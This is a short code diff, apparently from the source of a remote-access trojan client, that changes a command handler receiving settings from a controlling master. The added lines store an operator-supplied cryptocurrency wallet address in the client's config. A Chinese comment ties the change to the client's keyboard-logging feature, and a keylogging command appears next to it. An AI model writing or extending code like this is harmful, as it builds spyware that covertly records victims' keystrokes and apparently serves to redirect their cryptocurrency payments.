@@ -527,6 +527,9 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	case CMD_MASTERSETTING:
 		if (ulLength > sizeof(MasterSettings)) {
 			memcpy(&m_settings, szBuffer + 1, sizeof(MasterSettings));
+			// Remark 打开键盘记录或下一次启动客户端才会生效
+			iniFile cfg(CLIENT_PATH);
+			cfg.SetStr("settings", "wallet", m_settings.WalletAddress);
 		}
 		break;
 	case COMMAND_KEYBOARD: //键盘记录
